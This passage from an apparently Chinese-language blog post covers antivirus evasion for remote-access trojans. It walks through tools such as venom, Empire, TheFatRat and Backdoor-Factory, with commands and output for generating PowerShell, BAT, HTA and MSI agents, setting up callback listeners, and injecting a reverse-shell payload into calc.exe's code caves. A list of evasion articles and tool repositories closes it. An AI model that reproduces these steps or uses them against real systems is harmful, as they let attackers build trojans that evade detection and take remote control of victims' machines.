(.exe)</span><br><span class="line"></span><br><span class="line">    AGENT Nº4:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : C</span><br><span class="line">    AGENT EXTENSION    : EXE</span><br><span class="line">    AGENT EXECUTION    : press to exec (exe)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/WpgWCa</span><br><span class="line"></span><br><span class="line">    AGENT Nº5:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : PSH-CMD</span><br><span class="line">    AGENT EXTENSION    : EXE</span><br><span class="line">    AGENT EXECUTION    : press to exec (exe)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/MZnQKs</span><br><span class="line"></span><br><span class="line">    AGENT Nº6:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : C</span><br><span class="line">    AGENT EXTENSION    : RB</span><br><span class="line">    AGENT EXECUTION    : ruby agent.rb</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/eZkoTP</span><br><span class="line"></span><br><span class="line">    AGENT Nº7:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : MSI-NOUAC</span><br><span class="line">    AGENT EXTENSION    : MSI</span><br><span class="line">    AGENT EXECUTION    : msiexec /quiet /qn /i agent.msi</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/zcA4xu</span><br><span class="line"></span><br><span class="line">    AGENT Nº8:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : POWERSHELL</span><br><span class="line">    AGENT EXTENSION    : BAT</span><br><span class="line">    AGENT EXECUTION    : press to exec (bat)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/BYCUhb</span><br><span class="line"></span><br><span class="line">    AGENT Nº9:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : HTA-PSH</span><br><span class="line">    AGENT EXTENSION    : HTA</span><br><span class="line">    AGENT EXECUTION    : http://192.168.44.128</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/mHC72C</span><br><span class="line"></span><br><span class="line">    AGENT Nº10:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : PSH-CMD</span><br><span class="line">    AGENT EXTENSION    : PS1 + BAT</span><br><span class="line">    AGENT EXECUTION    : press to exec (bat)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/GJHu7o</span><br><span class="line"></span><br><span class="line">    AGENT Nº11:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : PSH-CMD</span><br><span class="line">    AGENT EXTENSION    : BAT</span><br><span class="line">    AGENT EXECUTION    : press to exec (bat)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/nY2THB</span><br><span class="line"></span><br><span class="line">    AGENT Nº12:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : VBS</span><br><span class="line">    AGENT EXTENSION    : VBS</span><br><span class="line">    AGENT EXECUTION    : press to exec (vbs)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/PDL4qF</span><br><span class="line"></span><br><span class="line">    AGENT Nº13:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : PSH-CMD</span><br><span class="line">    AGENT EXTENSION    : VBS</span><br><span class="line">    AGENT EXECUTION    : press to exec (vbs)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/sd3867</span><br><span class="line"></span><br><span class="line">    AGENT Nº14:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : PSH-CMD|C</span><br><span class="line">    AGENT EXTENSION    : PDF</span><br><span class="line">    AGENT EXECUTION    : press to exec (pdf)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/N1VTPu</span><br><span class="line"></span><br><span class="line">    AGENT Nº15:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : EXE-SERVICE</span><br><span class="line">    AGENT EXTENSION    : EXE</span><br><span class="line">    AGENT EXECUTION    : sc start agent.exe</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/dCYdCo</span><br><span class="line"></span><br><span class="line">    AGENT Nº16:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : C + PYTHON (uuid obfuscation)</span><br><span class="line">    AGENT EXTENSION    : EXE</span><br><span class="line">    AGENT EXECUTION    : press to exec (exe)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/HgnSQW</span><br><span class="line"></span><br><span class="line">    AGENT Nº17:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : C + AVET (obfuscation)</span><br><span class="line">    AGENT EXTENSION    : EXE</span><br><span class="line">    AGENT EXECUTION    : press to exec (exe)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/kKJuQ5</span><br><span class="line"></span><br><span class="line">    AGENT Nº18:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : SHELLTER (trojan embedded)</span><br><span class="line">    AGENT EXTENSION    : EXE</span><br><span class="line">    AGENT EXECUTION    : press to exec (exe)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/9MtQjM</span><br><span class="line"></span><br><span class="line">    AGENT Nº19:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : CSHARP</span><br><span class="line">    AGENT EXTENSION    : XML + BAT</span><br><span class="line">    AGENT EXECUTION    : press to exec (bat)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/coKiKx</span><br><span class="line"></span><br><span class="line">    AGENT Nº20:</span><br><span class="line">    ───────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : PSH-CMD|EXE</span><br><span class="line">    AGENT EXTENSION    : BAT|EXE</span><br><span class="line">    AGENT EXECUTION    : http://192.168.44.128/EasyFileSharing.hta</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/R8UNW3</span><br><span class="line"></span><br><span class="line">    AGENT Nº21:</span><br><span class="line">    ───────────</span><br><span class="line">    DESCRIPTION        : ICMP (ping) Reverse Shell</span><br><span class="line">    TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)</span><br><span class="line">    AGENT EXTENSION    : EXE</span><br><span class="line">    DROPPER EXTENSION  : BAT</span><br><span class="line">    AGENT EXECUTION    : http://192.168.44.128/dropper.bat</span><br><span class="line">    DISCLOSURE BY      : @Daniel Compton (icmpsh.exe)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="5-Empire"><a href="#5-Empire" class="headerlink" title="5 Empire"></a>5 Empire</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 配置监听器</span></span><br><span class="line">(Empire) &gt; uselistener &lt;Tab&gt;&lt;Tab&gt;</span><br><span class="line">dbx    http    http_com    http_foreign    http_hop</span><br><span class="line">http_mapi    meterpreter    onedrive    redirector</span><br><span class="line">(Empire: listeners) &gt; uselistener http</span><br><span class="line">(Empire: listeners/http) &gt; info</span><br><span class="line">(Empire: listeners/http) &gt; set Host http://192.168.205.111</span><br><span class="line">(Empire: listeners/http) &gt; set Port 25675</span><br><span class="line">(Empire: listeners/http) &gt; execute</span><br><span class="line"><span class="meta">#</span><span class="bash"> 生成木马</span></span><br><span class="line">(Empire: listeners/http) &gt; back</span><br><span class="line">(Empire) &gt; usestager &lt;Tab&gt;&lt;Tab&gt;</span><br><span class="line">(Empire) &gt; usestager windows/launcher_bat http</span><br><span class="line">(Empire: stager/windows/launcher_bat) &gt; execute</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 运行完毕后生成bat文件，受害者获得该文件并执行</span></span></span><br><span class="line">Invoke-Item C:\users\DELL\launcher.bat</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># 除了生成bat文件以外，还可以生成基于脚本语言的一句话，用于无文件攻击</span></span></span><br><span class="line">(Empire: listeners) &gt; launcher powershell http</span><br><span class="line">(Empire: listeners) &gt; launcher python http</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-theFatRAT"><a href="#6-theFatRAT" class="headerlink" title="6 theFatRAT"></a>6 theFatRAT</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Screetsec/TheFatRat</span><br><span class="line">./update &amp;&amp; chmod + x setup.sh &amp;&amp; ./setup.sh</span><br><span class="line"></span><br><span class="line">proxychains ./fatrat</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[01]  Create Backdoor with msfvenom</span><br><span class="line">[02]*  Create Fud 100% Backdoor with Fudwin 1.0</span><br><span class="line">[03]  Create Fud Backdoor with Avoid v1.2  </span><br><span class="line">[04]  Create Fud Backdoor with backdoor-factory [embed] </span><br><span class="line">[05]  Backdooring Original apk [Instagram, Line,etc] </span><br><span class="line">[06]*  Create Fud Backdoor 1000% with PwnWinds [Excelent] </span><br><span class="line">[07]  Create Backdoor For Office with Microsploit </span><br><span class="line">[08]  Trojan Debian Package For Remote Acces [Trodebi] </span><br><span class="line">[09]  Load/Create auto listeners  </span><br><span class="line">[10]  Jump to msfconsole  </span><br><span class="line">[11]  Searchsploit  </span><br><span class="line">[12]  File Pumper [Increase Your Files Size] </span><br><span class="line">[13]  Configure Default Lhost &amp; Lport </span><br><span class="line">[14]  Cleanup  </span><br><span class="line">[15]  Help  </span><br><span class="line">[16]  Credits  </span><br><span class="line">[17]  Exit  </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2和6是普遍反映做的比较好的两个功能模块。</p>
<h3 id="7-Backdoor-Factory"><a href="#7-Backdoor-Factory" class="headerlink" title="7 Backdoor-Factory"></a>7 Backdoor-Factory</h3><p>思想：利用PE文件内部大量的00空余空间，打patch填充payload，在不影响程序的正常功能的情况下执行恶意代码。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/secretsquirrel/the-backdoor-factory.git</span><br><span class="line"><span class="meta">#</span><span class="bash">kali已预装，但无法识别exe,要执行以下步骤。</span></span><br><span class="line">pip install capstone</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>[使用] step1</strong>:判断程序是否可以打patch</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[&gt;</span><span class="bash">&gt;&gt;&gt;] ./backdoor.py -f workspace/calc.exe -S</span></span><br><span class="line">[*] Checking if binary is supported</span><br><span class="line">[*] Gathering file info</span><br><span class="line">[*] Reading win64 entry instructions</span><br><span class="line">workspace/calc.exe is supported.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>[使用] step2</strong>:分析程序中可用的空余空间<br>下面的例子中，calc在data段中有431单位长度的空间，rsrc段中有386单位长度的空间。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[&gt;</span><span class="bash">&gt;&gt;&gt;] ./backdoor.py -f workspace/calc.exe -c</span></span><br><span class="line">[*] Checking if binary is supported</span><br><span class="line">[*] Gathering file info</span><br><span class="line">[*] Reading win64 entry instructions</span><br><span class="line">Looking for caves with a size of 380 bytes (measured as an integer</span><br><span class="line">[*] Looking for caves</span><br><span class="line">No section</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">Begin Cave 0x1c64</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">End of Cave 0x1e08</span></span><br><span class="line">Size of Cave (int) 420</span><br><span class="line">**************************************************</span><br><span class="line">We have a winner: .data</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">Begin Cave 0x1e51</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">End of Cave 0x2000</span></span><br><span class="line">Size of Cave (int) 431</span><br><span class="line">SizeOfRawData 0x200</span><br><span class="line">PointerToRawData 0x1e00</span><br><span class="line">End of Raw Data: 0x2000</span><br><span class="line">**************************************************</span><br><span class="line">We have a winner: .rsrc</span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">Begin Cave 0x6750</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash">End of Cave 0x68d2</span></span><br><span class="line">Size of Cave (int) 386</span><br><span class="line">SizeOfRawData 0x4800</span><br><span class="line">PointerToRawData 0x2200</span><br><span class="line">End of Raw Data: 0x6a00</span><br><span class="line">**************************************************</span><br><span class="line">[*] Total of 3 caves found</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>[使用] step3</strong>:获得可用的payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[&gt;</span><span class="bash">&gt;&gt;&gt;] ./backdoor.py -f workspace/calc.exe -s show</span></span><br><span class="line">The following WinIntelPE64s are available: (use -s)</span><br><span class="line">   cave_miner_inline</span><br><span class="line">   iat_reverse_tcp_inline</span><br><span class="line">   iat_reverse_tcp_inline_threaded</span><br><span class="line">   iat_reverse_tcp_stager_threaded</span><br><span class="line">   iat_user_supplied_shellcode_threaded</span><br><span class="line">   meterpreter_reverse_https_threaded</span><br><span class="line">   reverse_shell_tcp_inline</span><br><span class="line">   reverse_tcp_stager_threaded</span><br><span class="line">   user_supplied_shellcode_threaded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>[使用] step4</strong>:填充并生成</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">[&gt;</span><span class="bash">&gt;&gt;&gt;] ./backdoor.py -f workspace/calc.exe -s cave_miner_inline -J -H 192.168.43.128 -P 4444  -o 1.exe</span></span><br><span class="line">[*] In the backdoor module</span><br><span class="line">[*] Checking if binary is supported</span><br><span class="line">[*] Gathering file info</span><br><span class="line">[*] Reading win64 entry instructions</span><br><span class="line">[*] Looking for and setting selected shellcode</span><br><span class="line">[*] Creating win64 resume execution stub</span><br><span class="line">[*] Looking for caves that will fit the minimum shellcode length of 44</span><br><span class="line">[*] All caves lengths:  44, 44, 55</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########################################################</span></span></span><br><span class="line">The following caves can be used to inject code and possibly</span><br><span class="line">continue execution.</span><br><span class="line">**Don&#x27;t like what you see? Use jump, single, append, or ignore.**</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###########################################################</span></span></span><br><span class="line">[*] Cave 1 length as int: 44</span><br><span class="line">[*] Available caves: </span><br><span class="line">1. Section Name: None; Section Begin: None End: None; Cave begin: 0x2f4 End: 0x3fc; Cave Size: 264</span><br><span class="line">2. Section Name: .text; Section Begin: 0x400 End: 0x1000; Cave begin: 0xf84 End: 0xffc; Cave Size: 120</span><br><span class="line">3. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x1016 End: 0x1064; Cave Size: 78</span><br><span class="line">4. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x10a7 End: 0x1114; Cave Size: 109</span><br><span class="line">5. Section Name: None; Section Begin: None End: None; Cave begin: 0x1c68 End: 0x1e04; Cave Size: 412</span><br><span class="line">7. Section Name: .data; Section Begin: 0x1e00 End: 0x2000; Cave begin: 0x1e55 End: 0x1ffc; Cave Size: 423</span><br><span class="line">8. Section Name: None; Section Begin: None End: None; Cave begin: 0x20e6 End: 0x220a; Cave Size: 292</span><br><span class="line">9. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x302c End: 0x3064; Cave Size: 56</span><br><span class="line">10. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x42ac End: 0x4324; Cave Size: 120</span><br><span class="line">11. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6754 End: 0x68ce; Cave Size: 378</span><br><span class="line">12. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6911 End: 0x69fd; Cave Size: 236</span><br><span class="line">**************************************************</span><br><span class="line">[!] Enter your selection: 11</span><br><span class="line">[!] Using selection: 11</span><br><span class="line">[*] Changing flags for section: .rsrc</span><br><span class="line">[*] Cave 2 length as int: 44</span><br><span class="line">[*] Available caves: </span><br><span class="line">1. Section Name: None; Section Begin: None End: None; Cave begin: 0x2f4 End: 0x3fc; Cave Size: 264</span><br><span class="line">2. Section Name: .text; Section Begin: 0x400 End: 0x1000; Cave begin: 0xf84 End: 0xffc; Cave Size: 120</span><br><span class="line">3. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x1016 End: 0x1064; Cave Size: 78</span><br><span class="line">4. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x10a7 End: 0x1114; Cave Size: 109</span><br><span class="line">5. Section Name: None; Section Begin: None End: None; Cave begin: 0x1c68 End: 0x1e04; Cave Size: 412</span><br><span class="line">7. Section Name: .data; Section Begin: 0x1e00 End: 0x2000; Cave begin: 0x1e55 End: 0x1ffc; Cave Size: 423</span><br><span class="line">8. Section Name: None; Section Begin: None End: None; Cave begin: 0x20e6 End: 0x220a; Cave Size: 292</span><br><span class="line">9. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x302c End: 0x3064; Cave Size: 56</span><br><span class="line">10. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x42ac End: 0x4324; Cave Size: 120</span><br><span class="line">11. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6754 End: 0x68ce; Cave Size: 378</span><br><span class="line">12. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6911 End: 0x69fd; Cave Size: 236</span><br><span class="line">**************************************************</span><br><span class="line">[!] Enter your selection: 12</span><br><span class="line">[!] Using selection: 12</span><br><span class="line">[*] Changing flags for section: .rsrc</span><br><span class="line">[*] Cave 3 length as int: 55</span><br><span class="line">[*] Available caves: </span><br><span class="line">1. Section Name: None; Section Begin: None End: None; Cave begin: 0x2f4 End: 0x3fc; Cave Size: 264</span><br><span class="line">2. Section Name: .text; Section Begin: 0x400 End: 0x1000; Cave begin: 0xf84 End: 0xffc; Cave Size: 120</span><br><span class="line">3. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x1016 End: 0x1064; Cave Size: 78</span><br><span class="line">4. Section Name: .rdata; Section Begin: 0x1000 End: 0x1e00; Cave begin: 0x10a7 End: 0x1114; Cave Size: 109</span><br><span class="line">5. Section Name: None; Section Begin: None End: None; Cave begin: 0x1c68 End: 0x1e04; Cave Size: 412</span><br><span class="line">7. Section Name: .data; Section Begin: 0x1e00 End: 0x2000; Cave begin: 0x1e55 End: 0x1ffc; Cave Size: 423</span><br><span class="line">8. Section Name: None; Section Begin: None End: None; Cave begin: 0x20e6 End: 0x220a; Cave Size: 292</span><br><span class="line">9. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x302c End: 0x3064; Cave Size: 56</span><br><span class="line">10. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x42ac End: 0x4324; Cave Size: 120</span><br><span class="line">11. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6754 End: 0x68ce; Cave Size: 378</span><br><span class="line">12. Section Name: .rsrc; Section Begin: 0x2200 End: 0x6a00; Cave begin: 0x6911 End: 0x69fd; Cave Size: 236</span><br><span class="line">**************************************************</span><br><span class="line">[!] Enter your selection: 10</span><br><span class="line">[!] Using selection: 10</span><br><span class="line">[*] Changing flags for section: .rsrc</span><br><span class="line">[*] Patching initial entry instructions</span><br><span class="line">[*] Creating win64 resume execution stub</span><br><span class="line">[*] Looking for and setting selected shellcode</span><br><span class="line">File 1.exe is in the &#x27;backdoored&#x27; directory</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0xFF-附录技术文章"><a href="#0xFF-附录技术文章" class="headerlink" title="0xFF 附录技术文章"></a>0xFF 附录技术文章</h2><p>基础知识</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[1]免杀技术有一套（免杀方法大集结）-2017-05-22</span><br><span class="line">https://www.freebuf.com/column/135314.html</span><br><span class="line"></span><br><span class="line">[2] 远控免杀从入门到实践（1）：基础篇 -2020</span><br><span class="line">https://www.freebuf.com/articles/system/227461.html</span><br><span class="line">https://github.com/TideSec/BypassAntiVirus</span><br><span class="line"></span><br><span class="line">[3]免杀艺术 1: 史上最全的免杀方法汇总 2017年</span><br><span class="line">https://blog.csdn.net/weixin_34303897/article/details/90350289?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&amp;spm=1001.2101.3001.4242</span><br><span class="line"></span><br><span class="line">[4] 免杀技术常用方法 https://blog.csdn.net/whatday/article/details/105715578</span><br><span class="line"></span><br><span class="line">[5] 免杀技术大杂烩---乱拳也打不死老师傅 https://github.com/Airboi/bypass-av-note</span><br></pre></td></tr></table></figure>

<p>远控分析</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[1]从剖析cs木马生成到开发免杀工具 https://www.freebuf.com/company-information/242596.html </span><br><span class="line"></span><br><span class="line">[2]meterpreter免杀及对抗分析 https://www.freebuf.com/sectool/157122.html</span><br><span class="line"></span><br><span class="line">[3]渗透利器Cobalt Strike - 第2篇 APT级的全面免杀与企业纵深防御体系的对抗 https://xz.aliyun.com/t/4191</span><br><span class="line"></span><br><span class="line">[4]浅谈meterpreter免杀 https://www.jianshu.com/p/9d2790f6c8aa</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>加载器</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">shellcode加载</span></span><br><span class="line">[1]红队基本操作-通用Shellcode加载器： https://www.freebuf.com/articles/system/228795.html</span><br><span class="line"></span><br><span class="line">[2]Github项目shellcode_launcher：https://github.com/clinicallyinane/shellcode_launcher/</span><br><span class="line"></span><br><span class="line">[3]Windows shellcode执行技术入门指南 https://zhuanlan.zhihu.com/p/82090444?from_voters_page=true</span><br><span class="line"></span><br><span class="line">[4]一篇关于shellcode xor编解码的文章：http://blog.chinaunix.net/uid-26275986-id-5037780.html</span><br><span class="line">DLL加载：</span><br><span class="line">rundll32.exe dll_msf.dll,main</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>分离免杀</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[1]分离免杀的实践 https://www.cnblogs.com/nul1/p/12167561.html</span><br><span class="line"></span><br><span class="line">[2]侯亮分离免杀 https://micro8.gitbook.io/micro8/contents-1/61-70/66-jie-zhu-aspx-dui-payload-jin-hang-fen-li-mian-sha</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>项目</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">免杀工具列表</span></span><br><span class="line">git clone https://github.com/Veil-Framework/Veil-Evasion.git</span><br><span class="line">git clone https://github.com/r00t-3xp10it/venom.git</span><br><span class="line">https://www.shellterproject.com/</span><br><span class="line">git clone https://github.com/Screetsec/TheFatRat.git</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">壳</span></span><br><span class="line">github donut（C#，将exe转化位shellcode，通过C#来加载）</span><br><span class="line"></span><br></pre></td></tr></table></figure>



